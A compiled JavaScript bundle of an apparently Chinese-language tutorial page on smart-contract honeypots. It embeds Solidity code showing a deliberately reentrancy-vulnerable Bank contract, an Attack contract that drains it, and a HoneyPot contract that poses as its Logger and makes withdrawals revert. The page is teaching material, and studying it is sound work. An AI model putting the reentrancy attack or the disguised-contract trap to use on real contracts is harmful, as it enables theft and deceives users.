"use strict";(self.webpackChunkweb_3_blog=self.webpackChunkweb_3_blog||[]).push([[8174],{3905:(n,e,t)=>{t.d(e,{Zo:()=>u,kt:()=>g});var r=t(7294);function o(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}function a(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,r)}return t}function i(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?a(Object(t),!0).forEach((function(e){o(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}function c(n,e){if(null==n)return{};var t,r,o=function(n,e){if(null==n)return{};var t,r,o={},a=Object.keys(n);for(r=0;r<a.length;r++)t=a[r],e.indexOf(t)>=0||(o[t]=n[t]);return o}(n,e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(n);for(r=0;r<a.length;r++)t=a[r],e.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(n,t)&&(o[t]=n[t])}return o}var l=r.createContext({}),s=function(n){var e=r.useContext(l),t=e;return n&&(t="function"==typeof n?n(e):i(i({},e),n)),t},u=function(n){var e=s(n.components);return r.createElement(l.Provider,{value:e},n.children)},d={inlineCode:"code",wrapper:function(n){var e=n.children;return r.createElement(r.Fragment,{},e)}},p=r.forwardRef((function(n,e){var t=n.components,o=n.mdxType,a=n.originalType,l=n.parentName,u=c(n,["components","mdxType","originalType","parentName"]),p=s(t),g=o,y=p["".concat(l,".").concat(g)]||p[g]||d[g]||a;return t?r.createElement(y,i(i({ref:e},u),{},{components:t})):r.createElement(y,i({ref:e},u))}));function g(n,e){var t=arguments,o=e&&e.mdxType;if("string"==typeof n||o){var a=t.length,i=new Array(a);i[0]=p;var c={};for(var l in e)hasOwnProperty.call(e,l)&&(c[l]=e[l]);c.originalType=n,c.mdxType="string"==typeof n?n:o,i[1]=c;for(var s=2;s<a;s++)i[s]=t[s];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}p.displayName="MDXCreateElement"},354:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>l,contentTitle:()=>i,default:()=>d,frontMatter:()=>a,metadata:()=>c,toc:()=>s});var r=t(7462),o=(t(7294),t(3905));const a={},i="\u871c\u7f50",c={unversionedId:"solidity/solidity_hack/honeypot",id:"solidity/solidity_hack/honeypot",title:"\u871c\u7f50",description:"\u871c\u7f50\u662f\u6355\u6349\u9ed1\u5ba2\u7684\u9677\u9631\u3002",source:"@site/docs/solidity/solidity_hack/honeypot.md",sourceDirName:"solidity/solidity_hack",slug:"/solidity/solidity_hack/honeypot",permalink:"/docs/solidity/solidity_hack/honeypot",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"solidity",previous:{title:"\u4f7f\u7528\u5916\u90e8\u5408\u7ea6\u9690\u85cf\u6076\u610f\u4ee3\u7801",permalink:"/docs/solidity/solidity_hack/hiding_malicious_code_with_external_contract"},next:{title:"front running",permalink:"/docs/solidity/solidity_hack/front_running"}},l={},s=[],u={toc:s};function d(n){let{components:e,...t}=n;return(0,o.kt)("wrapper",(0,r.Z)({},u,t,{components:e,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"\u871c\u7f50"},"\u871c\u7f50"),(0,o.kt)("p",null,"\u871c\u7f50\u662f\u6355\u6349\u9ed1\u5ba2\u7684\u9677\u9631\u3002"),(0,o.kt)("p",null,"\u7ed3\u5408\u4e24\u4e2a\u6f0f\u6d1e\u5229\u7528\uff0c\u91cd\u5165\u548c\u9690\u85cf\u6076\u610f\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u5efa\u4e00\u4e2a\u5408\u7ea6 \u8fd9\u5c06\u6355\u83b7\u6076\u610f\u7528\u6237\u3002"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\n/*\nBank \u662f\u8c03\u7528 Logger \u6765\u8bb0\u5f55\u4e8b\u4ef6\u7684\u5408\u7ea6\u3002\nBank.withdraw() \u5bb9\u6613\u53d7\u5230\u91cd\u5165\u653b\u51fb\u3002\n\u56e0\u6b64\uff0c\u4e00\u540d\u9ed1\u5ba2\u8bd5\u56fe\u4ece\u94f6\u884c\u4e2d\u63d0\u53d6\u4ee5\u592a\u5e01\u3002\n\u4f46\u5b9e\u9645\u4e0a\u53ef\u91cd\u5165\u6f0f\u6d1e\u662f\u9ed1\u5ba2\u7684\u8bf1\u9975\u3002\n\u901a\u8fc7\u4f7f\u7528 HoneyPot \u4ee3\u66ff Logger \u90e8\u7f72 Bank\uff0c\u8be5\u5408\u7ea6\u53d8\u4e3a \u9ed1\u5ba2\u7684\u9677\u9631\u3002\u8ba9\u6211\u4eec\u770b\u770b\u5982\u4f55\u3002\n\n1. Alice \u90e8\u7f72 HoneyPot\n2. Alice \u4f7f\u7528 HoneyPot \u7684\u5730\u5740\u90e8\u7f72 Bank\n3. Alice \u5c06 1 \u4e2a\u4ee5\u592a\u5e01\u5b58\u5165\u94f6\u884c\u3002\n4. Eve \u5728 Bank.withdraw \u4e2d\u53d1\u73b0\u4e86\u53ef\u91cd\u5165\u6f0f\u6d1e\u5e76\u51b3\u5b9a\u7834\u89e3\u5b83\u3002\n5. Eve\u7528Bank\u7684\u5730\u5740\u90e8\u7f72Attack\n6. Eve \u7528 1 \u4e2a Ether \u8c03\u7528 Attack.attack() \u4f46\u4ea4\u6613\u5931\u8d25\u3002\n\nEve \u8c03\u7528 Attack.attack() \u5e76\u5f00\u59cb\u4ece\u94f6\u884c\u63d0\u53d6\u4ee5\u592a\u5e01\u3002\n\u5f53\u6700\u540e\u4e00\u4e2a Bank.withdraw() \u5373\u5c06\u5b8c\u6210\u65f6\uff0c\u5b83\u8c03\u7528 logger.log()\u3002\nLogger.log() \u8c03\u7528 HoneyPot.log() \u5e76\u6062\u590d\u3002\u4ea4\u6613\u5931\u8d25\u3002\n*/\ncontract Bank {\n    mapping(address => uint) public balances;\n    Logger logger;\n\n    constructor(Logger _logger) {\n        logger = Logger(_logger);\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        logger.log(msg.sender, msg.value, "Deposit");\n    }\n\n    function withdraw(uint _amount) public {\n        require(_amount <= balances[msg.sender], "Insufficient funds");\n\n        (bool sent, ) = msg.sender.call{value: _amount}("");\n        require(sent, "Failed to send Ether");\n\n        balances[msg.sender] -= _amount;\n        \n        // \u871c\u7f50\u751f\u6548\u5730\u65b9\n        logger.log(msg.sender, _amount, "Withdraw");\n    }\n}\n\ncontract Logger {\n    event Log(address caller, uint amount, string action);\n\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        emit Log(_caller, _amount, _action);\n    }\n}\n\n// \u9ed1\u5ba2\u8bd5\u56fe\u901a\u8fc7\u91cd\u5165\u6765\u8017\u5c3d\u5b58\u50a8\u5728\u94f6\u884c\u4e2d\u7684\u4ee5\u592a\u5e01\u3002\n// Hacker tries to drain the Ethers stored in Bank by reentrancy.\ncontract Attack {\n    Bank bank;\n\n    constructor(Bank _bank) {\n        bank = Bank(_bank);\n    }\n\n    fallback() external payable {\n        if (address(bank).balance >= 1 ether) {\n            bank.withdraw(1 ether);\n        }\n    }\n\n    function attack() public payable {\n        bank.deposit{value: 1 ether}();\n        bank.withdraw(1 ether);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n// \u5047\u8bbe\u8fd9\u6bb5\u4ee3\u7801\u5728\u4e00\u4e2a\u5355\u72ec\u7684\u6587\u4ef6\u4e2d\uff0c\u56e0\u6b64\u5176\u4ed6\u4eba\u65e0\u6cd5\u8bfb\u53d6\u5b83\u3002\ncontract HoneyPot {\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        if (equal(_action, "Withdraw")) {\n            revert("It\'s a trap");\n        }\n    }\n\n    // Function to compare strings using keccak256\n    function equal(string memory _a, string memory _b) public pure returns (bool) {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n\n\n')))}d.isMDXComponent=!0}}]);